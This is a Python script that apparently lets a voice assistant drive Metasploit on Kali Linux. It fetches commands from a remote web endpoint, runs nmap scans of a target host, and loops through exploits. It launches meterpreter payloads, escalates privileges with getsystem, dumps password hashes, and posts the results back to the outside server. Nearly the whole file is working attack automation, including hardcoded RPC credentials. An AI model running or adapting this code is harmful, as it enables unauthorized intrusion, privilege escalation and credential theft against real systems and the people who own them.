#!/usr/bin/env python
import sys
def print_no_newline(string):
    #import sys
    sys.stdout.write(string)
    sys.stdout.flush()
    sys.stdout.write('\r')
    sys.stdout.flush()
    
# This function attempts to return the real IP address of the Kali instance so that we know what to set lHost IP to
def myipaddress():
    import socket
    return (([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["0.0.0.0"])[0]

try:
    from metasploit.msfrpc import MsfRpcClient
except:
    print("you need to instll pymetapsloit from github XSSNinja")
    sys.exit(1)

try:
    import nmap
except:
    print("You need to install python nmap from whereveer it is on the net")
    sys.exit(1)

#import simplejson as json
#import urllib
#import urllib2
# these libraries should be all installed by default on Kali
import json
import requests
import socket
import sys
import time
import binascii
import pprint
import unicodedata


StopMeNow = False
urlfromAlexa = 'https://xss.ninja/Kali_Read.php'
urltoAlexa = 'https://xss.ninja/Kali2Alexa.php'
print ('urlfromAlexa is: ' + urlfromAlexa)
print ('urltoAlexa is: ' + urltoAlexa)
alexaAPIKey = ''
alexaSessionId = ''
#post data is defined here
openports = ''
portscanres =''
exploitres = ''
searchres = ''
usepayloadres = ''
postmodule = ''
shellres = ''
getuidres = ''
winlin = ''
exploit =''
#rhost ='192.168.1.56'
#lhost ='192.168.137.197'
rhost = ''
lhost = ''
payload= ''
rport= '0'
lport = '4000'
exploits = ''
sessions=''
consoles=''
error=''
mstatus=''
sig=''
prettyprint = 0
responsetype = ''
windows = "True" # assume windows until proven otherwise

# log into the MSFRPCClient and try to keep it alive during the session (times out in a few min)
# if we can't instantiate it then tell the user why and quit
try:
    cli = MsfRpcClient(username='msf',password ='test',ssl=False, port=55553)
except:
    print("Could not connect to MsrRPC service with username of 'msf' and password of 'test' on port 55553")
    sys.exit(1)

SomethingToSend = False
#loop forever
while (StopMeNow == False):
    #write response if any to Alexa first
    # we include everything about the state of the metasploit or scan
    if prettyprint == 0:
        print_no_newline('|')
        time.sleep(1)
    if prettyprint == 1:
        print_no_newline('/')
        time.sleep(1)
    if prettyprint == 2:
        print_no_newline('-')
        time.sleep(1)
    if prettyprint == 3:
        print_no_newline('\\')
        time.sleep(1)
    prettyprint = prettyprint + 1
    if prettyprint == 4:
        prettyprint = 0
        
    # FromKali messag type contains all the vars initted to empty string above:    

    # --------------------------------------------------------------------------------------------
    # Send any data back to Alexa that we have gathered from the collection of possible attributes
    #---------------------------------------------------------------------------------------------
    if SomethingToSend == True:
        if (exploitres != ''):
            exploitres = exploitres.replace("\n","")
            exploitres = exploitres.replace("[*]","")
            exploitres = exploitres.replace("[]",'""')
            exploitres = exploitres.replace("\\"," slash ")
            getuidres = getuidres.replace("\\"," slash ") # do this otherwise NodeJS can't remove the \v or \u000b no matter what replacing/cleaning code you use... which then throws a JSON exception 
            getuidres = getuidres.replace("\n","")
            exploitres = exploitres.replace("/"," ")
            exploitres = exploitres.replace("("," ")
            exploitres = exploitres.replace(")"," ")
            exploitres = exploitres.replace("_"," ")

        cmd = '{"responsetype": "'+ responsetype + '", "openports": ['+ openports +'], "portscanres": "'+  portscanres + '", "exploitres": "'+  exploitres + '", "searchres": "'+  searchres + '", "usepayloadres": "'+  usepayloadres +'", "shellres": "'+  shellres + '", "getuidres": "'+  getuidres + '", "windows": "'+ windows +'", "exploit": "'+ exploit +'", "rhost": "'+ rhost +'", "lhost": "'+ lhost +'", "payload": "'+ payload +'", "rport": "'+ rport +'", "lport": "' + lport +'", "exploits": "' + exploits +'", "sessions": "'+ sessions + '", "postmodule": "'+ postmodule +'", "error": "'+  error +'", "mstatus": "'+ mstatus +'"}'
        sig = 'sig=somesignature'
        print "!!!built cmd... sending to Alexa...\n"

        print cmd
        outpayload = {'cmd': cmd, 'sig': sig}
        print "about to send payload: " + json.dumps(payload)
        
        try: 
            r = requests.post(urltoAlexa, data=outpayload)
            #data=json.dumps(outpayload))
            #print "Kali2Alexa> " + payload.to##### string??
            print "Response> " + binascii.hexlify(r.text)   
            if r.text != '':
                print r.text
            SomethingToSend = False
        except requests.exceptions.RequestException as e:
            print "Kali2Alexa> call failed..." + e
    #--------------------------------------------------------------------------------------------  
    # Read any commands from Alexa and act on the event/command type
    #--------------------------------------------------------------------------------------------
    # command|{json body}|sig=blahblah
    try:
        r = requests.get(urlfromAlexa)
        #print("Requesting from Alexa queue at " + urlfromAlexa) 
        r.encoding = "utf-8"
        if r.text == '': continue   #### if the result is an empty response then go to the next iteration of the loop
        # convert back from unicode
        output = r.text
        print(output)
        #
        strsplit = output.split("|")  # r.text.split("|")  # we get: exploit=[{'windows/..':'8000'},{'blah':'909'}...]   and   sig=ca83b9be521e40a2512fc285aa63db7e
        ctemp = strsplit[0].split("=")
        body = ctemp[1] # parse off the payload
        cmd = ctemp[0].lower()  # parse off the command name
        tsig = strsplit[1].split("=") # parse off the signature
        sig = tsig[1].lower()
        print("<Alexa said>" + body + "</Alexa said>")
        #parse body into a dictionary containing the exploit list and ports for the exploit
        tbody= body.split("=")
        try:
            #asciibod = unicodedata.normalize('NFKD', body).encode('ascii','ignore')
            varz = json.loads(body)
            #dbody= json.loads(tbody[1])
        except:
            print("failed to JSONIFY the command body into a list of lists")
        
        print ("body = " + body)
        print ("command =" + cmd) 
        print ("sig = " + sig)
        if cmd == 'scan':
            rlist = cmd                                 #r.text.split(",")
        # if cmd == 'exploit':
        #    if (type(varz) is dict):
        #         dbody = [(v,w) for v,w in varz.items()]
        #    if type(dbody) is list:
        #        lbody = dbody
                
        # set cmd to the first item in the list from Alexa

        # ------------------------------------------------
        # Eval whatever command we get from Alexa
        # ------------------------------------------------

        ##### STOP command
        if cmd == 'stop':
            print "Stopping"
            StopMeNow = True

        ##### SCAN command
        if cmd == 'scan':
            #start scan
            # cmd should say scan
            # body should contain the IP to scan
            # sig should contain the hash versus the shared secret and the body
            #******** varz = json.loads(body) **************************************************************
            #varz = json.loads('{"targetip": "192-168-1-17", "scantype": "light"}')  #test
            tip= varz["targetip"]
            print "targetIP = " + tip
            stype= varz["scantype"]
            print "scan type = " + stype
            error = "No open ports"      # if error = "No open ports" then the scan worked but the machine is firewalled.
            rhost = tip.replace("-",".")
            if stype == "light":
                scanports = '21,22,23,110,113,1433,1635,445,8000'  #according to L0rdV4d3r,these 10 ports have highly exploitable exploits
                #scanports = '23,25,53,80,443,445,1635,8000,8080,8888'  #according to L0rdV4d3r,these 10 ports have highly exploitable exploits
                #But we don't want port 80 or 8080 because these are typically web servers or services that require multi-stage attacks
                #like getting a file on someone's computer or getting a user to click a link.
            if stype == "medium":
                scanports = '21,22,23,25,53,80,110,111,113,137,443,445,1635,8000,8080,8888'
            if stype == "large":
                scanports = '0-35555'
                
            print "Scanning " + rhost + " for ports " + scanports
            nm = nmap.PortScanner()
            # run NMAP scan
            nm.scan(rhost, scanports)
            print nm.command_line()
            openports = ""
            portstatus = ""
            try:
                for protocol in nm[rhost].all_protocols():
                    #print('Protocol : ' + protocol)
                    prt = nm[rhost][protocol].keys()
                    #lport.sort()
                    for port in prt:
                        #print "]port= " + str(port) + " state = " +nm[rhost][protocol][port]['state']
                        if nm[rhost][protocol][port]['state'] == "open":
                            openports += '{"port": "' + str(port) + '", "service": "' + nm[rhost][protocol][port]['product'] + '"},'
                            portstatus += ' port ' + str(port) + ' is running service ' + nm[rhost][protocol][port]['product'] + ' '
                            error = "Success"  # Yay! we found an open port
            except:
                portscanres = 'Unable to scan ' + rhost
                print(portscanres)
                error = "Fail"                # either a program error or the target machine was down
            # openports should contain the ports open
            openports = openports[:-1]  # chop semicolon off of and make a little key value pair string out of it
            print "<o_p_e_n p_o_r_t_s> = " + openports
            portscanres = "can remove this" #nm.csv().replace(",","|")
            if 'Microsoft' in  openports:
                windows = "True"
            else:
                windows = "False"
            if openports <> "":
               print("!Open ports=" + openports)
            else:
               print("!No ports discovered. IP: " + tip + " is not responding to port scan")
            hostname=socket.gethostname()
            #lhost=socket.gethostbyname(hostname)
            lhost = myipaddress()
            print("Your Computer Name is:"+hostname)
            print("Your Computer IP Address is:"+lhost)
            mstatus = "scan complete. I found the following open ports " + portstatus
            responsetype = "portscan" # possible options = {portscanres, exploitres, searchres, usepayloadres, shellres}
            # We set all of these vars and are now setting the Send state to trigger the send to Alexa
            #* openports {  list of ports open }
            #* portscanres " text of the port scan "
            #* windows = T or False
            #* error = error status {'Success' or 'Fail'}
            # mstatus = message returned by error or status update
            # trigger the send on the next loop
            SomethingToSend = True
        
        ##### USE PAYLOAD command
        if cmd == 'use payload':
            #use payload
            print "Setting payload"
            
        ##### USE POST-EXPLOIT module command
        if cmd == 'use post-exploit module':
            #use post exploit module
            print "Use post exploit module"

        ## !! ### use  E X P L O I Ts command ------------------------->            
        if cmd == 'exploit':
            # cmd should say exploit
            # dbody should contain list of exploits to scan with their rport numbers
            # sig should contain the hash versus the shared secret and the body string
            print "Exploit"
            #rhost = rlist[1]
            print("rhost =" + rhost)
            
            # we have already established a connection to MSFCli so go ahead and start looping through exploits and rports
            # loading a list like: '[{"windows/http/icecast_header": "8000"},{"windows/http/blueborne": "445"}]'
            for z in varz:
                expl = unicodedata.normalize('NFKD', z['exploit']).encode('ascii','ignore')
                rport = unicodedata.normalize('NFKD', z['port']).encode('ascii','ignore')
                #for expl, rport in z.iteritems():
                print("Exploit from Alexa=" + expl +"") # can drop in a pipe on either side to see if the exploit name is trimmed properly
                print(type(expl))
                print("Rport from Alexa=" + rport)
                
                #ex = cli.modules.use('exploit','exploit/'+expl)    #ex = cli.modules.use('exploit','windows/http/icecast_header')
                ex = cli.modules.use('exploit', expl)    #ex = cli.modules.use('exploit','windows/http/icecast_header')

                print "Exploit set successfully!"
                payloads = ex.payloads
                if len(payloads) > 0:
                    print "We have payloads!"
##                    ex.execute(payload='windows/meterpreter/bind_tcp')
##                    print "set payload to meterpreter"
                # else ex.execute(payload='linux/x86/meterpreter/reverse')
                # print ex.description
                ex['RHOSTS'] = rhost 	# typically '192.168.1.x' MS5 rhost to rhosts!!! can now be set to cidr block 192.168.0.0/24
                print 'rhost=' + rhost
                if any("RPORT" in s for s in ex.required):
                    ex['RPORT'] = int(rport) 	# typically 8000
                print 'rport= %i', ex['RPORT']
                    # ex['VERBOSE']= True
                if any("ConnectTimeout" in s for s in ex.required):
                    ex['ConnectTimeout'] = 10
                    print "ConnTO=%i", ex['ConnectTimeout']
                if any("SSLVersion" in s for s in ex.required):
                    ex['SSLVersion'] = 'TLS1.2'
                    print 'SSL ver=' + ex['SSLVersion']
                if any("LHOST" in s for s in ex.required):
                    ex['LHOST'] = lhost	# 192.168.137.X
                    print 'LHOST is ' + ex['LHOST']
                if any("LPORT" in s for s in ex.required):
                    if lport == 0: lport = 4000
                    ex['LPORT'] = int(lport) 	# typically 4000
                    print 'LPORT is %i', ex['LPORT']
                # get input to continue
                #raw_input("Press Enter to start " + expl + ":" + rport)
                print ("Attempting to print ex to the console:")
                print (ex)
                # linux/x86/meterpreter/reverse_tcp <for Linux for 32 and 64 bit>
                # TODO: If windows then 
                ex.execute(payload='windows/meterpreter/bind_tcp')
                # else ex.execute(payload='linux/x86/meterpreter/reverse')
                print "Executing payload\n"
                idstr = ''
                id = 0
                time.sleep(3)  #wait 3 seconds and try the shell
                sys.stdout.flush()
                print cli.sessions.list
                #wait patiently for a meterpreter session
                for loop in range(10):
                    time.sleep(1)
                    print cli.sessions.list
                    if len (cli.sessions.list) > 0:
                        print "Got a session after %i seconds", loop +1
                        break
                #start pwning
                if len (cli.sessions.list) > 0:
                    idstr = next(iter(cli.sessions.list)) #"{1: {'info'" in session_str:
                    id = int(float(idstr)) 
                    error = "Success"
                    exploitres = "Success"
                    mstatus = "exploit successful"
                    sessions = idstr
                    print "Session id = " + str(id)
                    #sys.stdout.flush() # if we do the flush it kills things, idk why
                else:
                    print "Exploit failed. Session was not created for " + expl
                    mstatus = "exploit failed a session was not created at this time"
                    exploitres = "Fail"
                    sessions = ""
                    error = "Fail"
                    continue  #just move on to the next exploit in the dictionary until we run out
                if id > 0:
                    shell = cli.sessions.session(id)
                    shell.write('getuid\n')
                    time.sleep(0.5)
                    getuidres = shell.read()                
                    sys.stdout.flush()
                    exploitres ="success"
                    # if Windows
                    if windows == "True":
                        shell.write('getsystem\n')
                        shellres = shell.read()    #'...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).\n'
                        sys.stdout.flush()
                        print 'get  system =', shellres
                        shell.write('run post/windows/gather/hashdump\n')
                    elif windows == "False": # ex it's Linux
                        shell.write('run post/linux/gather/hashdump\n')
                    else:
                        print "Var windows was not set to an expected value: '"
                        print windows
                        print type(windows)
                    # Huge loop of shell-reads until a big blob starting with '[*] Obtaining the boot key...\n
                    # and ending with :::\n\n\n'
                    passdump = shell.read()
                    #t1 = datetime.now()
                    #wait patiently for a meterpreter session
                    loopcount = 0
                    while ':::\n\n\n' not in passdump:
                        time.sleep(1)
                        passdump += shell.read()
                        #if (datetime.now()-t1).seconds > 8:		## careful here because Alexa times out in 8 seconds!
                        if loopcount > 15 : break
                    print "Done!\n" + passdump
                    exploitres = passdump.replace("\\"," backslash ")
                    exploitres = exploitres.replace("\\n"," ")
                    sessions= "1"
                    postmodule = "hashdump"
                    sys.stdout.flush()
                    shell.write('exit')
                    print "closed shell"
                    if passdump != '':
                        mstatus = "I successfully retrieved user names and hashes and took the liberty of printing them to your Kali terminal."
                    else:
                        mstatus = "failed to retrieve accounts from the target"
                    responsetype = "exploitres"       #{portscanres, exploitres, searchres, usepayloadres, shellres}
                    SomethingToSend=True
                    break  # (NEW) break out of the look around the full exploit set if we got a shell!
                #else continue
                        
                    #All of these vars should be set now if all went well
                    #& openports {  list of ports open }
                    #& portscanres " text of the port scan "
                    #* exploitres = 
                    #* usepayloadres = result of usepayload
                    #* shellres = result of shell command
                    #* getuidres = result of getuid command
                    #& windows = T or False
                    #& rhost = IP address of remote machine to attack
                    #& rport = remote port for connect back
                    #& payload = payload name for the exploit
                    #& exploits = list of possible exploits for the port
                    #* payloads = list of possible payloads for the exploit
                    #* sessions = list of sessions active
                    #* error = error status
                    #& mstatus = metasploit status or error

#----------------------------------------------------
        if cmd == 'shell command':
            #use shell command
            print "Running shell command "
        
    except requests.exceptions.RequestException as e:
	print(e)
    #try:
    #    print(e.status_code)
    #except:
    #    print("")
#end while
print ('Session Finished')
sys.exit(1)


